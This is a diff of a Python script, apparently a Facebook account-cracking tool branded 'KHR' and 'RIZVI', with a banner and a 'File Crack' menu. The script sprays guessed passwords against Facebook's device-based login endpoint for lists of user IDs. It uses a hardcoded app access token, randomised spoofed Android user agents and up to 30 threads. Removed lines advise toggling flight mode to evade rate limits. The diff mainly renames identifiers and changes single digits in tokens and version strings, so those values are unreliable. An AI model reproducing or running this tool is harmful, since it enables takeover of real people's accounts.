@@ -1,11 +1,11 @@
 #!/usr/bin/python
-#Original written By KHR HEROO<3
+#Original written By RIZVI BROTHER<3
 
 import os,zlib
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print('RIZVI BRAND COMMING...\n')
+print('RIZVI BRAND COMMING ...\n')
 
 
 
@@ -29,7 +29,7 @@ except ModuleNotFoundError:
 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as rizviKHR
+from concurrent.futures import ThreadPoolExecutor as KHRKHR
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -41,7 +41,7 @@ from concurrent.futures import ThreadPoolExecutor
 fast_work = ThreadPoolExecutor(max_workers=15).submit
 ua = ["Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920 [FBAN/FB4A;FBAV/183.0.0.27.123;FBBV/17656946;FBDM/{density=2.5,width=1280,height=1920};FBLC/en_PK;FBCR/Nepal_Telecom;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/7.3.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"]
     
-model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684133b5353854ee114880fb00227cee/Model60').text.splitlines()
+model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
 totaldmp = 0
 count = 0
 loop = 0
@@ -56,17 +56,17 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-fbav = random.choice(['445.0.0.34.118','443.0.0.23.229','427.0.0.33.63','426.0.0.26.50','420.0.0.32.61','419.0.0.37.71','419.0.0.29.71','418.0.0.33.69','417.0.0.33.65','382.0.0.33.111','380.0.0.29.109','379.0.0.24.109','322.0.0.35.121','326.0.0.34.120','325.0.0.36.170','339.0.0.39.120','337.0.0.51.119','337.0.0.51.119','335.0.0.47.113','334.1.0.45.119','334.0.0.43.119','333.0.0.35.119','332.0.0.45.117','330.0.0.50.118','309.0.0.47.119','307.0.0.40.111','304.0.0.39.118','305.0.0.40.120','302.0.0.45.119','300.2.0.58.129','300.1.0.57.129','299.0.0.51.236','296.0.0.44.119','294.0.0.39.118','293.0.0.43.120','292.0.0.60.123','290.0.0.44.121','284.0.0.50.107','279.0.0.43.120','233.0.0.39.113','229.0.0.35.117','227.0.0.43.158','224.0.0.33.114','222.0.0.48.113','220.0.0.46.112','219.0.0.42.114','209.0.0.39.91','216.0.0.38.104','207.0.0.33.100','203.0.0.16.293'])
-fbbv = random.choice(['442611883','442410873','336416485','335814638','336015926','443010639','444209262','444411021','447626277','442812559','442811621','282418109','282616749','282818448','282818049','283017963','283419120','283419120','284012886','285022375','285217161','284416989','274797363','282018877','281818581','239634218','248233979','250937654','251953326','253340452','255824605','261476335','263723580','265245015','268946212','272369098','271126404','233020918','448014984','137424444','140791845','149356190','142863906','152362346','153408057','155323327','157411927','163964762','160467766','162302402'])
+fbav = random.choice(['445.0.0.34.118','443.0.0.23.229','427.0.0.31.63','426.0.0.26.50','420.0.0.32.61','419.0.0.37.71','419.0.0.29.71','418.0.0.33.69','417.0.0.33.65','382.0.0.33.111','380.0.0.29.109','379.0.0.24.109','322.0.0.35.121','326.0.0.34.120','325.0.0.36.170','319.0.0.39.120','317.0.0.51.119','317.0.0.51.119','315.0.0.47.113','314.1.0.45.119','314.0.0.43.119','313.0.0.35.119','312.0.0.45.117','310.0.0.50.118','309.0.0.47.119','307.0.0.40.111','304.0.0.39.118','305.0.0.40.120','302.0.0.45.119','300.2.0.58.129','300.1.0.57.129','299.0.0.51.236','296.0.0.44.119','294.0.0.39.118','293.0.0.43.120','292.0.0.60.123','290.0.0.44.121','284.0.0.50.107','279.0.0.43.120','231.0.0.39.113','229.0.0.35.117','227.0.0.43.158','224.0.0.33.114','222.0.0.48.113','220.0.0.46.112','219.0.0.42.114','209.0.0.39.91','216.0.0.38.104','207.0.0.33.100','203.0.0.16.293'])
+fbbv = random.choice(['442611883','442410873','316416485','315814638','316015926','443010639','444209262','444411021','447626277','442812559','442811621','282418109','282616749','282818448','282818049','283017963','283419120','283419120','284012886','285022375','285217161','284416989','274797363','282018877','281818581','239634218','248231979','250937654','251953126','253340452','255824605','261476335','263723580','265245015','268946212','272369098','271126404','231020918','448014984','137424444','140791845','149356190','142863906','152362346','153408057','155323327','157411927','163964762','160467766','162302402'])
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/196.0.0.20;FBBV/594326928;FBDM/'+'{density=2.5,width=1280,height=1440}'+';FBLC/en_PK;FBRV/517368763;FBCR/UMS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N971N;FBSV/10.3.1;nullFBCA/armeabi-v7a:armeabi;]'
+    END = '[FBAN/FB4A;FBAV/196.0.0.25;FBBV/833645503;FBDM/'+'{density=2.0,width=1080,height=1440}'+';FBLC/fr_FR;FBRV/445214032;FBCR/IND-JIO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N981B;FBSV/8.1.1;nullFBCA/armeabi-v7a:armeabi;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; V2027 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};'+END
     return ua
 
 def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/196.0.0.20;FBBV/594326928;FBDM/'+'{density=2.5,width=1280,height=1440}'+';FBLC/en_PK;FBRV/517368763;FBCR/UMS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N971N;FBSV/10.3.1;nullFBCA/armeabi-v7a:armeabi;]'
+    END = '[FBAN/FB4A;FBAV/196.0.0.25;FBBV/833645503;FBDM/'+'{density=2.0,width=1080,height=1440}'+';FBLC/fr_FR;FBRV/445214032;FBCR/IND-JIO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N981B;FBSV/8.1.1;nullFBCA/armeabi-v7a:armeabi;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; V2027 Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})[FBAN/FB4A;FBAV/45.0.0.{str(random.randint(1000,9000))};FBBV/{str(random.randint(100000,900000))};'+END
     return ua
 
@@ -79,14 +79,14 @@ F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 logo =("""           
-\033[1;33m          $$\   $$\ $$\   $$\ $$$$$$$\  
-\033[1;33m          $$ | $$  |$$ |  $$ |$$  __$$\ 
-\033[1;33m          $$ |$$  / $$ |  $$ |$$ |  $$ |
-\033[1;33m          $$$$$  /  $$$$$$$$ |$$$$$$$  |
-\033[1;33m          $$  $$<   $$  __$$ |$$  __$$< 
-\033[1;33m          $$ |\$$\  $$ |  $$ |$$ |  $$ |   
-\033[1;33m          $$ | \$$\ $$ |  $$ |$$ |  $$ |       
-\033[1;33m          \__|  \__|\__|  \__|\__|  \__|            
+\033[1;33m     $$\   $$\ $$\   $$\ $$$$$$$\  \x1b[38;5;46mALLAMA 
+\033[1;33m     $$ | $$  |$$ |  $$ |$$  __$$\   \x1b[38;5;46mKHADIM
+\033[1;33m     $$ |$$  / $$ |  $$ |$$ |  $$ |   \x1b[38;5;46mHUSSAIN
+\033[1;33m     $$$$$  /  $$$$$$$$ |$$$$$$$|       \x1b[38;5;46m RIZVI
+\033[1;33m     $$  $$<   $$  __$$ |$$  __$$< 
+\033[1;33m     $$ |\$$\  $$ |  $$ |$$ |  $$ | 
+\033[1;33m     $$ | \$$\ $$ |  $$ |$$ |  $$ |     
+\033[1;33m     \__|  \__|\__|  \__|\__|  \__|   
 ••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
 \033[1;36m            ALLAMA KHADIM HUSSAIN RIZVI
 \033[;33m                 KHR ALWAYS BRAND
@@ -114,11 +114,11 @@ def result(OKs,cps):
         print(47*'-')
         input("Press enter to back ")
         exit()
-def rizvi():   
+def KHR():   
     os.system('clear')
     print(logo)
     
-    print(f'[1] File Cloning')  
+    print(f'[1] File Crack')  
     print('')
     select = input('Select Menu>: ')
     if select =='1':
@@ -133,6 +133,7 @@ def method_crack():
     global methods
     clear()
     print(f'(1) Method {1}')
+    print(f'(2) Method {2}')
     #print(f'[4] Method {4}')
     print(f'<0> BACK')
     print('')
@@ -150,7 +151,7 @@ def method_crack():
     #    methods.append('methodD')
    #     main_crack().crack(id)
     elif option =='0':
-        rizvi()
+        KHR()
     else:
       print('\n Select Valid Option ...')
       time.sleep(2)
@@ -198,7 +199,7 @@ class main_crack():
 "source": "device_based_login",
 "email": sid,
 "password": ps,
-"access_token": "350685533728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
@@ -264,7 +265,7 @@ class main_crack():
 "source": "device_based_login",
 "email": sid,
 "password": ps,
-"access_token": "350685533728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
@@ -331,7 +332,7 @@ class main_crack():
 "source": "device_based_login",
 "email": sid,
 "password": ps,
-"access_token": "350685533728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
@@ -406,7 +407,7 @@ class main_crack():
                     break
                 else:
                     continue
-                #time.sleep(33)
+                #time.sleep(31)
             
             loop+=1
         except requests.exceptions.ConnectionError:
@@ -431,13 +432,12 @@ class main_crack():
             os.system("clear")
             print(logo)
             
-            print(f"\r{Z}Use Automate When Start Cracking {S}")
-            print(f"\r{Z}Use Flight ✈️ Mode In Every 5>Minute {S}")
+            print(f"\r{Z}           Use Automate When Start Cracking {S}")
             print(47*"-")
             print(f'{Z} Total IDs : %s ' % len(self.id))
             print(f'{F} Checking Process Has Been Started...')
             print(47*"-")
-            with rizviKHR(max_workers=30) as KHRworld:
+            with KHRKHR(max_workers=30) as KHRworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -467,4 +467,4 @@ def removef():
         KHR(allkey)            
  
 
-rizvi()
+KHR()
